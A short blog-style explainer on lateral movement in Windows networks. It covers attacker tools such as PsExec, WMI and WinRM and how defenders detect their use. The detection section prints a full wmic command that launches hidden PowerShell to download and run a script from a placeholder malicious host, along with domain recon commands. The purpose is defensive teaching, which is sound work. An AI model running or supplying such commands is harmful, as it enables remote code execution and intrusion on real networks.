---
title: "Lateral Movement"
date: 2025-05-02
tags: ["malware", "strategy", "cybersecurity"]
---

Once a hacker has gained access to a system through their path of choice, the next usual step is to try and gain access to other—usually more high-profile machines on the network. This process is known as **lateral movement**, and it can be done in a variety of ways. To be more specific about *why* hackers do this, let’s talk about the advantages of gaining access to other machines.

### Why?

- Gain access to more privileged accounts  
- Reach valuable data (like on a file server)  
- Spread persistence across the network (creating re-entry points or backdoors)  

Having skill in lateral movement is arguably one of the most important things for a hacker. It’s their ability to *move* through the environment once they get in, and it must be done with precision and stealth. It’s also where many attackers get caught, since they can leave plenty of breadcrumbs along the way.

Sometimes they’ll just get into a system and monitor common processes and behaviors for a while. This helps them build a plan for how best to navigate the network undetected. Usually, they’ll use techniques like LotL (Living off the Land)—[which I wrote about here](../living-off-the-land-attack/)—to stay hidden.

### How?

Hackers usually use LOLBins to evade detection. Some of the tools are as follows:

- **PsExec**  
A remote command execution tool in SysInternals. Often used to run or spawn shells on other machines.

- **WMI (`wmic`)**  
Used to query remote systems or start processes across the network.

- **RDP**  
Used to log in like a real user, assuming credentials have been found or stolen.

- **WinRM**  
Remote PowerShell execution used in enterprise environments.

### Detection

Detecting lateral movement is tricky because it uses legitimate, trusted tools and real credentials. However, defenders can look for patterns that suggest something suspicious is happening under the surface.

---

#### 1. Unusual Parent-Child Process Relationships

When a hacker is on a machine, they may be using LOLBins, but the **way** those tools are used can give them away. One way defenders detect this is by looking at **which process started another**—also known as parent-child process relationships.

Let’s say we see this process chain in a system:
```
winword.exe → cmd.exe → powershell.exe → wmic.exe
```
- `winword.exe → cmd.exe` implies there was likely a macro embedded in a Word document (probably from a phishing email).
- That macro launches `cmd.exe`, which runs `powershell.exe`.
- PowerShell can then download a payload, and finally `wmic.exe` is used for the **lateral movement**.

Here’s an example command that might be executed via `wmic.exe`:
```
wmic /node:"10.0.0.12" process call create "powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
```
- `/node:"10.0.0.12"` → Targets another machine on the network.  
- `process call create` → Asks that machine to run a new process.  
- `"powershell -NoP -W Hidden -C IEX(...)"` → Starts a hidden PowerShell instance that:  
  - `-NoP`: No profile (faster, stealthier)  
  - `-W Hidden`: Hides the PowerShell window  
  - `IEX(...)`: Downloads and runs a malicious PowerShell script in memory  

---

#### 2. New or Rare Use of Lateral Tools

Tools like `PsExec`, `wmic`, `winrm`, and PowerShell remoting are normally used by system admins—but only in certain environments and contexts. Defenders might set up alerts for their use in unexpected locations, or flag activity that doesn’t match the usual user behavior. Sudden or anomalous use of these tools is a red flag that lateral movement could be underway.

---

#### 3. Login Anomalies

Things like **multiple login attempts**, **a low-privilege user suddenly logging into many machines**, or **remote logins at odd hours** (e.g., an HR employee remoting in at 3 AM) are classic indicators of lateral movement.

---

#### 4. Suspicious Recon Activity

These commands are often used to **map the network** and **identify valuable targets**:
```
net view /domain
net use
net group "Domain Admins" /domain
```
They aren’t commands a normal user would ever run, and they often precede lateral movement.

---